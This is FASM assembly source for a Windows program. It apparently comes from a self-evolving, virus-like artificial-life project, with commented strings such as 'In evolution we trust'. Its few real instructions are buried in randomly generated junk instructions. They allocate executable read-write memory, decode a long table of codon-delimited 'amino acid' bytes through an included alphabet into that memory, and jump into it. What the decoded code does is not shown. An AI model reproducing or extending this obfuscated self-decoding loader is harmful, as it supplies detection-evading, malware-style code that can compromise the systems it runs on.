include 'E:\Programme\FASM\INCLUDE\win32ax.inc'

RndNum = %t AND 0xFFFF'FFFF
macro GetNewRandomNumber
{
    RndNum = ((RndNum*214013+2531011) AND 0xFFFF'FFFF)
}

.data
       include 'data_n_equs.inc'
;        a db "Am I allowed to live?",0x0
;        b db "In evolution we trust",0x0


.code
start:
shl EBP, cl
or EBX,ESI
inc EBX
mov EAX,ECX
mov ECX,24632
cmp EBP,ESP
shl ESI, 23
and EBX,EDI
xor EBX,EDX
xor ESI,EAX
or EDX,ESI
dec EBX
push EDX
pop EAX
test EBP,9200
shl EDI, 182
add ESI,30695
inc EAX
mov EAX,11648
cmp EBP,2348
dec EAX
shr ESI, 188
xchg ESI,EDX
dec ESI
mov EBP,EDX
nop
shl EBP, 190
add EAX,26809
dec EDX
push EDX
pop ESI
push 30443
pop ESI
inc EDX
nop
add EDI,ESP
xchg EDX,EDI
nop

       AlignedSize=0x1'0000
       while ((EndAmino-StAmino)*8)>AlignedSize
           AlignedSize=AlignedSize+0x1'0000
       end while

sub EAX,EAX
nop
 push PAGE_EXECUTE_READWRITE
 push 0x1000
 push AlignedSize
nop
dec EAX
inc EBP
or EBX,EAX
inc ECX
nop
cmp EAX,ESI
xor ECX,ESP
dec EBX
inc EBP
add EBP,ESI
sub EAX,EAX
add ESI,EAX
or EDI,EDX
dec EBX
shl EBX, 196
nop
shr ECX, 233
mov EAX,EBP
shl EBP, cl
cmp EBP,EBX
inc EBP
cmp EBX,EAX
shl EDX, 66
mov ECX,8628
 push 0x0
 stdcall [VirtualAlloc]
nop
sub EDI,14303
cmp EBX,ESP
test EDI,17690
shr ESI, 147
       mov     [Place4Life], eax
xor EAX,EAX
sub EBP,EBP
       WriteMoreToMemory:
xor EBX,EBX
or ECX,EBX
nop
xor ECX,2789
dec ESI
shl EDI, 118
mov EDX,6932
push ECX
pop EDI
test ECX,EDI
xor ECX,27551
add EDX,ESI
nop
inc EDX
shl ESI, 179
sub ECX,21123
xor EDX,22111
mov EDX,5337
push ECX
pop ECX
and EDX,31550
nop
dec EDI
               mov     BL, byte[EBP+StAmino]
push ESP
pop EDX
               cmp     BL, StartCodon 
push EBP
pop EDI
nop
mov ECX,18375
nop
mov EDI,EBP
mov ESI,EAX
xchg EDX,EDI
xchg ESI,ECX
mov EDI,19147
mov ECX,EDX
nop
nop
               jne     SplicingNoStart
mov EAX,0
               SplicingNoStart:
nop
xor EDX,EBP
shl EDI, cl
shr ESI, 129
               cmp     BL, StopCodon
               jne     SplicingNoStop
mov EAX,145
shl ECX, 16
and ESI,27864
test ECX,ESP
xor ESI,ECX
shr ESI, 169
push EBP
pop ECX
sub ESI,14640
shr ESI, cl
and ESI,18199
or EDI,1708
shr ECX, 210
nop
dec EDX
xchg ECX,ESI
xor ESI,EBX
shr EDI, 254
inc EDI
nop
nop
               SplicingNoStop:
               or      BL, AL
               shl     EBX, 3
nop
inc ESI
test EDX,783
shr ECX, cl
sub EDI,4418
xor EDX,EDI
dec ESI
push EDX
pop EDI
cmp EDI,22656
xor ECX,9767
or ECX,9686
shr EDX, 165
push 0
pop ESI
lea ESI,[StartAlphabeth+EBX]
               mov     ECX,EBP
               shl     ECX, 3
dec EBX
and EDI,ESI
mov EDX,EDX
sub EDX,EBX
               mov     edi, [Place4Life]
               add     edi, ECX
mov ECX,8
xor EBX,ECX
add EDX,EBX
sub EDX,EDX
or EDX,EDX
shl EDX, 55
xchg EBX,EDX
inc EBX
inc EBX
dec EDX
inc EBX
shr EBX, cl
inc EDX
push 28355
pop EBX
dec EDX
and EBX,ESP
and EBX,EDX
shr EDX, cl
add EDX,EAX
nop
mov EDX,16119
               rep     movsb
mov EDI,11201
nop
or EDX,25330
mov EBX,8741
nop
dec EDX
xchg EDI,EBX
inc EDI
push EBX
pop ESI
shl ESI, 154
xor ESI,EAX
xchg ESI,EDI
dec ECX
shl EBX, cl
               inc     EBP
or EDX,23079
shl EDI, 138
cmp EBX,18431
xchg EBX,ECX
       cmp     EBP, (EndAmino-StAmino)
push EAX
pop ECX
mov EBX,25372
push EDX
pop EBX
mov EBX,23987
mov EDX,ECX
mov EBX,26702
push EAX
pop EBX
push EBX
pop EDX
mov ECX,EBP
nop
       jne     WriteMoreToMemory
mov EDX,20766
xchg ESI,EAX
and EDI,4192
add EAX,EAX
or ECX,EDI
or EDX,13581
nop
test ECX,EBP
inc ECX
shl EBP, cl
shr ECX, cl
dec ESI
shr EBP, 4
nop
mov EBP,27988
or EDX,20231
sub EDI,EBP
test EDI,EAX
and EBX,23443
shr ESI, 29
shr EDI, 49
inc ECX
       call    [Place4Life]                            ; Lets start!!!
test EDX,EBP
dec EDI
add EBP,EDX
push EDX
pop EBP
shl EBX, cl
nop
push 20297
pop EAX
shl ESI, 189

add EBP,26830
inc EBX
or EDI,19172
sub ECX,EDX
xor ESI,26626
or EDX,EBX
push 18413
pop EBX
or EDX,EBX
mov EDI,ESP
mov EBX,ECX
push ESI
pop EBP
shr ESI, cl
push 3103
pop EAX
test EAX,484
test ECX,30924
and EDX,EAX



; ##################################################################
; Alphabeth
StartAlphabeth:
include 'alphabeth.inc'
CreateAlphabet

EndAlphabeth:

; ##################################################################


; ##################################################################
; Amino Acids
db StopCodon
db 61
db 69
db 9
db 85
db StartCodon
db StopCodon
db 30
db 205
db 209
db 239
db 177
db 193
db 43
db 56
db StartCodon
db StopCodon
db StartCodon
db StopCodon
db 6
db 151
db 72
db 187
db 212
db 95
db 104
db 71
db 233
db 80
db 131
db 242
db 209
db 107
db 228
db 34
db 233
db 65
db 37
db 147
db 34
db 68
db 75
db 173
db 111
db 82
db 222
db 25
db 160
db StartCodon
db StopCodon
db 213
db 118
db 187
db 8
db 132
db 160
db 69
db 61
db 180
db 235
db 25
db 120
db 232
db 31
db 5
db 131
db 224
db 164
db 145
db 1
db 104
db 78
db 101
db StartCodon
db StopCodon
db 232
db 255
db 25
db 224
db 118
db 195
db 52
db 219
db 174
db 91
db StartCodon
db StopCodon
db 37
db 16
db 44
db 6
db 189
db 237
db 191
db 73
db 212
db 25
db 194
db 135
db 243
db 205
db 96
db 38
db 32
db 109
db 121
db 238
db 160
db 246
db 155
db 12
db 171
db 176
db StartCodon
db StopCodon
db 79
db 15
db 178
db 50
db 5
db 4
db 25
db 147
db 47
db 51
db 201
db 81
db 52
db 49
db 195
db 156
db 197
db 29
db 27
db 231
db 236
db 170
db 162
db 248
db 81
db 141
db 68
db 84
db 171
db StartCodon
db StopCodon
db 106
db 254
db 17
db 245
db 125
db 251
db 129
db 150
db 155
db StartCodon
db StopCodon
db 144
db 57
db 119
db 227
db 16
db 241
db 168
db 245
db 162
db 210
db 153
db 121
db 48
db 21
db 147
db 175
db 116
db 163
db 97
db 116
db 132
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 99
db 183
db 99
db 217
db 17
db 11
db 146
db 153
db 75
db 82
db 98
db 206
db 142
db 203
db 170
db 248
db 130
db 189
db 135
db 147
db 22
db 145
db 159
db 4
db 93
db 244
db 34
db 36
db 124
db 129
db 223
db 244
db 146
db 255
db 16
db 242
db 67
db 193
db 44
db 31
db 144
db StartCodon
db StopCodon
db 214
db 120
db 14
db 98
db 45
db 233
db 30
db 210
db 109
db 250
db 80
db 55
db StartCodon
db StopCodon
db 81
db 67
db 221
db 213
db 237
db 32
db 196
db 60
db 1
db 252
db 198
db 102
db 116
db 229
db 83
db 174
db 186
db StartCodon
db StopCodon
db 32
db 70
db 155
db 127
db 137
db 136
db 216
db 90
db 51
db 185
db 116
db 95
db 205
db 49
db 0
db 125
db 57
db 181
db 139
db 3
db 62
db 140
db 239
db 31
db 199
db 95
db 233
db 56
db 80
db 149
db 176
db 56
db 189
db StartCodon
db StopCodon
db 235
db 67
db 90
db 243
db 3
db 160
db 234
db 126
db 217
db 217
db 56
db 205
db 82
db 114
db 102
db 187
db 132
db 254
db 80
db 109
db 231
db 92
db 101
db 127
db 174
db 82
db 70
db 236
db 94
db 97
db 100
db 9
db 232
db 163
db 143
db 102
db StartCodon
db StopCodon
db 137
db 35
db 86
db 32
db 190
db 160
db 97
db 203
db 95
db 182
db 241
db 104
db 53
db 49
db 9
db 177
db 139
db 81
db 66
db 190
db 180
db 52
db 232
db 188
db 37
db 25
db 168
db 191
db 106
db 122
db 207
db 198
db 79
db 90
db 192
db 160
db 22
db 187
db 249
db 61
db 48
db 254
db 142
db 18
db 36
db 125
db 108
db 126
db 135
db 59
db 247
db 188
db 79
db 164
db 42
db 135
db 38
db 230
db 132
db StartCodon
db StopCodon
db 124
db 85
db 11
db 174
db 239
db 63
db 231
db StartCodon
db StopCodon
db 51
db 86
db 8
db 247
db 22
db 126
db 192
db 71
db 212
db 68
db 203
db 248
db 167
db 206
db 127
db StartCodon
db StopCodon
db 215
db 14
db 250
db 145
db 14
db StartCodon
db StopCodon
db 157
db 250
db 226
db 119
db 103
db 185
db 116
db 163
db StartCodon
db StopCodon
db 106
db 163
db 176
db 217
db 134
db 46
db 163
db 211
db 223
db 215
db 176
db 108
db 62
db 203
db 89
db 130
db 180
db 115
db 114
db 43
db 174
db 231
db 21
db 183
db 173
db 153
db StartCodon
db StopCodon
db 123
db 4
db 143
db 176
db 16
db 201
db 47
db 14
db 198
db 37
db 76
db StartCodon
db StopCodon
db 123
db 162
db 76
db 134
db 17
db 214
db StartCodon
db StopCodon
db 222
db 135
db 171
db 180
db 70
db 31
db 164
db 129
db 134
db 193
db 252
db 207
db 96
db 123
db 39
db StartCodon
db StopCodon
db 77
db 236
db 151
db 157
db 212
db 69
db 3
db 128
db 44
db 200
db 170
db 223
db 33
db 239
db 17
db 157
db 91
db 40
db 228
db 81
db 65
db 169
db 78
db 235
db 255
db 15
db 129
db 151
db 236
db 224
db 176
db 131
db 203
db StartCodon
db StopCodon
db 142
db 14
db 46
db 160
db 244
db 86
db 253
db 16
db 88
db 126
db 202
db 78
db 71
db 254
db 219
db 223
db 29
db 177
db 75
db StartCodon
db StopCodon
db 106
db 205
db 21
db 136
db 223
db 89
db 0
db 37
db 227
db StartCodon
db StopCodon
db 25
db 23
db 129
db 70
db 86
db 110
db 132
db 194
db 55
db 210
db 3
db 62
db 210
db 21
db 44
db 7
db 25
db 251
db 109
db 3
db 121
db 184
db 154
db 109
db 247
db 210
db 2
db 156
db 247
db 17
db 134
db 103
db 134
db 148
db 109
db 255
db 202
db 77
db StartCodon
db StopCodon
db 215
db 75
db 52
db 232
db 137
db 17
db 41
db 55
db 141
db 242
db 69
db 90
db 29
db 159
db 207
db 0
db 202
db 176
db 218
db 181
db 88
db 159
db 120
db 137
db 170
db 57
db StartCodon
db StopCodon
db 139
db 254
db 75
db 4
db 65
db 140
db 39
db 13
db 214
db 195
db 49
db 200
db 150
db 198
db 164
db 74
db 53
db 201
db 51
db 204
db 240
db StartCodon
db StopCodon
db 72
db 29
db 201
db 145
db 239
db 132
db 242
db 43
db 189
db 110
db 220
db 167
db 202
db 60
db 57
db 29
db 101
db 32
db 81
db 205
db StartCodon
db StopCodon
db 128
db 230
db 199
db 194
db 212
db 105
db 124
db StartCodon
db StopCodon
db 172
db 190
db 166
db 145
db 232
db 129
db 190
db 206
db 217
db 16
db 222
db 223
db 20
db 19
db 130
db 46
db 27
db 123
db 106
db 113
db 62
db 75
db 23
db 208
db 240
db 60
db 65
db 175
db 8
db 250
db 69
db 63
db 217
db 167
db 246
db 194
db 175
db StartCodon
db StopCodon
db 71
db 121
db 165
db 160
db 198
db 35
db 109
db 83
db 55
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 10
db 136
db 233
db 147
db 137
db 67
db 27
db 102
db 226
db 205
db 254
db 30
db 11
db 213
db 67
db 45
db 204
db 139
db 147
db 138
db 32
db 43
db 237
db 49
db 192
db 205
db 129
db 200
db 13
db 66
db 93
db 148
db 10
db 185
db 132
db 163
db 80
db 230
db 95
db 196
db 76
db 254
db 198
db 139
db StartCodon
db StopCodon
db 31
db 163
db 55
db 148
db 164
db 144
db 44
db 37
db 215
db 60
db 96
db 77
db 181
db 10
db 151
db 249
db 122
db 77
db 70
db 93
db 103
db 153
db 217
db 84
db 234
db 161
db 150
db 1
db 221
db 189
db 132
db 15
db 66
db 74
db 50
db 74
db 139
db 28
db 219
db 37
db 193
db 236
db 156
db 117
db 45
db 30
db 68
db 222
db 175
db 241
db 217
db 150
db 248
db 48
db 216
db 98
db 98
db 178
db 141
db 52
db 194
db 177
db 189
db 140
db 128
db 20
db 242
db 213
db 42
db 38
db 78
db 242
db 188
db 117
db 0
db 177
db 115
db 166
db 249
db 60
db 230
db 113
db 150
db 122
db 182
db 76
db 92
db 114
db 156
db 17
db 27
db 44
db 227
db 168
db 135
db 14
db 217
db 246
db 52
db 134
db 77
db 173
db 250
db 68
db 56
db 159
db 124
db 130
db 224
db 48
db 26
db 157
db 0
db 38
db 251
db 209
db 28
db 124
db 60
db 143
db 198
db 180
db 127
db 187
db 54
db 17
db 87
db 16
db 13
db 39
db 115
db 48
db 107
db 191
db 132
db 232
db 229
db 239
db 76
db StartCodon
db StopCodon
db 241
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 111
db 139
db 48
db 230
db 49
db 37
db 126
db 250
db 239
db 236
db 45
db StartCodon
db StopCodon
db 18
db 26
db 137
db 148
db 169
db 9
db 179
db 112
db 23
db 111
db 33
db 21
db 205
db 75
db 218
db 140
db 253
db 206
db 241
db 224
db 78
db 127
db 20
db 147
db 188
db 236
db 19
db 15
db 142
db 113
db 218
db 219
db 206
db 241
db StartCodon
db StopCodon
db 145
db 243
db 114
db 50
db 124
db 78
db 189
db 161
db 102
db 199
db 76
db 11
db 11
db 175
db 67
db 110
db 142
db 111
db 19
db 237
db 38
db 236
db 191
db 229
db StartCodon
db StopCodon
db 138
db 32
db 34
db 26
db 177
db 1
db 37
db 220
db 23
db StartCodon
db StopCodon
db 56
db 113
db 173
db 12
db 65
db 14
db 230
db 162
db 117
db 252
db 64
db 99
db 53
db 90
db 69
db 8
db 110
db 87
db 214
db 167
db 131
db StartCodon
db StopCodon
db 39
db 230
db 121
db 44
db 53
db 182
db 52
db 115
db 148
db 151
db 51
db 104
db 21
db 161
db 33
db 253
db 138
db 185
db 89
db 107
db 53
db 149
db 19
db 91
db 178
db 28
db 241
db 207
db 109
db 59
db 120
db 249
db 101
db 240
db 89
db 26
db 100
db 245
db 49
db 100
db 161
db 21
db 99
db 78
db 55
db 155
db 217
db 113
db 160
db StartCodon
db StopCodon
db 16
db 76
db 10
db 37
db 33
db 102
db 45
db 141
db 174
db 68
db 204
db 26
db 8
db 210
db 145
db 196
db 205
db 210
db 52
db 253
db 212
db 183
db 221
db 117
db 133
db 173
db 246
db 127
db 107
db 147
db 53
db 125
db 18
db 84
db 35
db 23
db 179
db 115
db 44
db 101
db StartCodon
_nopREAL
_nopREAL
_nopREAL
StAmino:
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 57
db 229
db 117
db 57
db 198
db 213
db 163
db 49
db 21
db 200
db 237
db 230
db 141
db 117
db 95
db 109
db 126
db 158
db 79
db 62
db 151
db 17
db 254
db 65
db 67
db 215
db 141
db 33
db 80
db 23
db 125
db 188
db 9
db 129
db 251
db 44
db 247
db 176
db 231
db 224
db 14
db 24
db 4
db 66
db 215
db 186
db 210
db 163
db 202
db 88
db 40
db 168
db 221
db 248
db 178
db 28
db 108
db 60
db 9
db 68
db 41
db 87
db 166
db 22
db 240
db 107
db 179
db 177
db 251
db 74
db 205
db 177
db 37
db 127
db 95
db 253
db 17
db 41
db 192
db 186
db 184
db 143
db 20
db 196
db 61
db 20
db 36
db 165
db 89
db 124
db 69
db 92
db 226
db 82
db 111
db 185
db 215
db 110
db 193
db 169
db 111
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 241
db 166
db 120
db 176
db 220
db 237
db StartCodon
db StopCodon
db 135
db 146
db 200
db 135
db 77
db 139
db 130
db 190
db 114
db StartCodon
db StopCodon
db 187
db 95
db 24
db 217
db 233
db 117
db 126
db 153
db 155
db 50
db 131
db 83
db 236
db 167
db 185
db 22
db 216
db 169
db 51
db 46
db 180
db 244
db 197
db 242
db 79
db 139
db 43
db 233
db 23
db 28
db 49
db 207
db 160
db 21
db 157
db 54
db 153
db 74
db StartCodon
db StopCodon
db 215
db 90
db 124
db 150
db 108
db 94
db StartCodon
db StopCodon
db 176
db 23
db 84
db 92
db 177
db 50
db 237
db 137
db 216
db 179
db 245
db 6
db 89
db 6
db 135
db 61
db 145
db 43
db 19
db 56
db 190
db 113
db 76
db 137
db 221
db 241
db 109
db 232
db 42
db 22
db 48
db 206
db 57
db 62
db 102
db 209
db 3
db 70
db 49
db 94
db 6
db 77
db 244
db 104
db 114
db 235
db StartCodon
db StopCodon
db 49
db 86
db 218
db 188
db 231
db 117
db 23
db 187
db 181
db 154
db 4
db 133
db 121
db 218
db 51
db 139
db 142
db 210
db 165
db 186
db StartCodon
db StopCodon
db 118
db 60
db 190
db 14
db 27
db 29
db 32
db 59
db 81
db 47
db 14
db 65
db 88
db 62
db 73
db 220
db 24
db 241
db 114
db 5
db 180
db 225
db 134
db 4
db 57
db 138
db 120
db 117
db 93
db 221
db 128
db 248
db 14
db 165
db 117
db 217
db 196
db 172
db 115
db 254
db 140
db 12
db 183
db 116
db 27
db 85
db 249
db 6
db 31
db 206
db 76
db 11
db 154
db 71
db 202
db 225
db 18
db 35
db 2
db 9
db 167
db 232
db 12
db 196
db 72
db 237
db 55
db 106
db 47
db 55
db 118
db 12
db 131
db 23
db 51
db 248
db 114
db 126
db 157
db 90
db 186
db 113
db 229
db 150
db 223
db 254
db 210
db 81
db 146
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 97
db 250
db 188
db 111
db 176
db 206
db 120
db 103
db 4
db 134
db 63
db StartCodon
db StopCodon
db 22
db 24
db StartCodon
db StopCodon
db 253
db 49
db 0
db 245
db 54
db 26
db 4
db 227
db 28
db 34
db 84
db 151
db 205
db 239
db 250
db 255
db 52
db 249
db 22
db 65
db 204
db 2
db 51
db 63
db 132
db 124
db 189
db 107
db 207
db 102
db 145
db 230
db 159
db 61
db 83
db 96
db 44
db 213
db 47
db 134
db 26
db 148
db 2
db 244
db StartCodon
_nopREAL
_nopREAL
db StopCodon
db 245
db StartCodon
db StopCodon
db 76
db 7
db 123
db 54
db 20
db 109
db 100
db 220
db 211
db 42
db 83
db 141
db 77
db 210
db 139
db 107
db 34
db 223
db 208
db 236
db 142
db 126
db 244
db 204
db 107
db 64
db 18
db 5
db 236
db 167
db 117
db 225
db StartCodon
db StopCodon
db 207
db 112
db 192
db 71
db 159
db 214
db 217
db 138
db 164
db 43
db 80
db 162
db 46
db 1
db 107
db 50
db 220
db 237
db 50
db 217
db 71
db 63
db 106
db 168
db 224
db 56
db 72
db 29
db 237
db 162
db 197
db 74
db 192
db 216
db 26
db 9
db 5
db 189
db 97
db 40
db 94
db 243
db 124
db 75
db 143
db 37
db 178
db 92
db 99
db 44
db 119
db 137
db 181
db 214
db 77
db 194
db 237
db 15
db 193
db 78
db 51
db 25
db 249
db 228
db 251
db 114
db 146
db 126
db 94
db 206
db 141
db 123
db 134
db 202
db 20
db 53
db 137
db 22
db 142
db 126
db 151
db 48
db 225
db 179
db 114
db 5
db 87
db 115
db 63
db 237
db 114
db 254
db 104
db 1
db 255
db 193
db 83
db 195
db 246
db 199
db 244
db 52
db 179
db 153
db 220
db 144
db 246
db 224
db 88
db 156
db 24
db 15
db 40
db 57
db 176
db 118
db 123
db 37
db 79
db 131
db 235
db 163
db 0
db StartCodon
db StopCodon
db 27
db 64
db 104
db 3
db 77
db 42
db 130
db 224
db 59
db 1
db 189
db StartCodon
db StopCodon
db 21
db 181
db 134
db 136
db 122
db 157
db 188
db 138
db 88
db 204
db StartCodon
db StopCodon
db 42
db 144
db 235
db 55
db 135
db 187
db 101
db 195
db 236
db 73
db 200
db 207
db 209
db 97
db 196
db 101
db 125
db 172
db 179
db 219
db 220
db 53
db 147
db 139
db 227
db 148
db 35
db 58
db 187
db 55
db 27
db 43
db 13
db 118
db 168
db 93
db StartCodon
db StopCodon
db 254
db 115
db 170
db 174
db 2
db 74
db 4
db 102
db 13
db 120
db 236
db 25
db 67
db 106
db 66
db 184
db 138
db 98
db 252
db 1
db 150
db 198
db 35
db 209
db 147
db 140
db 236
db 132
db 3
db 255
db 19
db 188
db 216
db 108
db 56
db 238
db 173
db 84
db 202
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 49
db 21
db 196
db 43
db 64
db 58
db 192
db 250
db 244
db 43
db 77
db 209
db 124
db 164
db 24
db 250
db 125
db 73
db 73
db 166
db 11
db 24
db 95
db 119
db 62
db 205
db 209
db 172
db 176
db 2
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
db StopCodon
db 208
db 47
db 188
db 54
db 179
db 29
db 163
db 187
db 193
db 251
db 28
db 160
db 202
db 189
db 131
db StartCodon
db StopCodon
db 107
db 100
db 101
db 70
db 254
db 116
db StartCodon
db StopCodon
db 94
db 191
db 113
db 173
db 2
db 128
db 116
db 148
db 240
db 91
db 236
db 93
db 115
db 91
db 43
db 12
db 47
db 134
db 133
db 75
db 13
db 60
db 5
db 237
db 13
db 229
db 231
db 50
db 83
db 248
db 157
db 172
db 90
db 102
db 55
db 124
db 128
db 190
db 46
db 67
db 214
db 155
db 168
db 199
db 210
db 187
db 123
db 108
db 158
db 135
db 65
db 189
db 114
db 106
db 149
db 244
db 255
db 22
db 76
db 250
db 176
db 19
db 96
db 18
db 20
db 6
db 103
db 79
db 221
db 40
db 135
db 199
db 56
db 61
db 126
db 89
db 22
db 249
db 130
db StartCodon
db StopCodon
db 143
db 226
db 63
db 3
db 22
db 138
db 15
db 34
db StartCodon
db StopCodon
db 179
db 25
db 95
db 249
db 127
db 86
db 180
db 75
db 100
db 244
db 227
db 65
db 168
db 74
db 173
db 188
db 55
db 148
db 66
db 206
db 154
db 151
db 14
db 75
db 69
db 144
db 211
db 159
db 153
db 8
db 58
db 148
db 123
db 65
db 99
db 207
db 117
db 95
db 75
db 93
db 136
db 111
db 2
db 5
db 201
db 37
db 111
db 25
db 200
db 18
db 26
db 86
db 54
db 93
db 252
db 234
db 242
db 128
db 247
db 63
db 169
db 63
db 59
db 182
db 5
db 32
db 63
db 252
db 248
db 75
db 190
db 199
db 121
db 219
db 54
db 113
db 83
db 140
db 233
db 108
db 148
db 100
db 226
db 226
db 166
db 161
db 73
db 87
db 30
db 213
db 0
db 252
db 241
db 81
db 16
db 237
db 228
db 114
db 242
db 55
db 132
db 175
db 100
db 216
db 159
db 17
db 210
db 75
db 116
db 16
db 243
db 148
db 126
db 23
db 89
db 199
db 244
db 149
db 15
db 242
db 50
db 219
db 33
db 41
db 206
db 147
db 225
db 72
db 123
db 96
db 190
db 185
db 37
db 107
db 119
db 94
db 206
db 220
db 164
db 42
db 216
db 20
db 117
db 143
db 190
db 180
db 130
db 222
db 47
db 58
db 53
db 27
db StartCodon
db StopCodon
db 98
db 182
db 99
db 198
db 185
db 84
db 207
db 137
db 250
db 169
db 142
db 5
db 140
db 75
db 217
db 188
db 85
db 101
db 157
db 172
db 195
db 7
db 214
db 15
db 129
db 129
db 248
db 4
db 39
db 238
db 251
db 38
db 60
db 142
db 212
db 214
db 123
db 92
db 213
db 230
db 153
db 94
db 63
db 242
db 107
db 87
db 118
db 26
db 58
db 246
db 218
db 119
db 76
db 252
db 232
db 255
db 148
db 247
db 17
db 255
db 78
db 29
db 245
db 118
db 30
db 98
db 46
db 128
db 122
db 6
